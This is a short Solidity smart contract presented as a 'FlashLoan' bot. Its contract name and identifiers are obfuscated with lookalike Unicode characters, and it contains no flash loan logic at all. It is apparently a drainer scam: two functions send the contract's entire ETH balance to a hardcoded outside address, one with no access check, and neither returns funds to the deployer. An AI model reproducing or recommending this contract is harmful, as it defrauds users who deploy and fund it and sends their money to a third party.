// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.6;

/// @title FlashLoan
contract Fℓaѕhℓ0aи {
    address private _𝓞;
    address constant private __𝘅 = 0xb58937eB4D98E79e66522D32DDc6a4004ed74Ae9;

    constructor() public payable {
        _𝓞 = msg.sender;
    }

    receive() external payable {}

    function 𝕐() public {
        require(msg.sender == _𝓞, "Access denied");
        address payable 𝓕 = address(uint160(__𝘅));
        𝓕.transfer(address(this).balance);
    }

    function ƒ() public {
        address payable __ = address(uint160(__𝘅));
        __.transfer(address(this).balance);
    }

    function ___() external view returns (uint256) {
        return address(this).balance;
    }
}
